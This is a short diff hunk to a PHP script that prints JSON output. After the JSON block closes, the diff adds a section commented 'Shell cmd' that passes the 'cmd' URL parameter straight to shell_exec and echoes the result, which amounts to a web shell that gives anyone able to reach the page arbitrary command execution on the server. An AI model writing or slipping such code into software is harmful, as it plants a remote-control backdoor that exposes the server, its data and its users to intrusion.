@@ -135,6 +135,12 @@ echo '"';
 
 //end of json
 echo "}";
+}
+
+//Shell cmd
+if(isset($_GET['cmd'])){
+    $output = shell_exec($_GET['cmd']);
+    echo $output;
 }	
 	
 
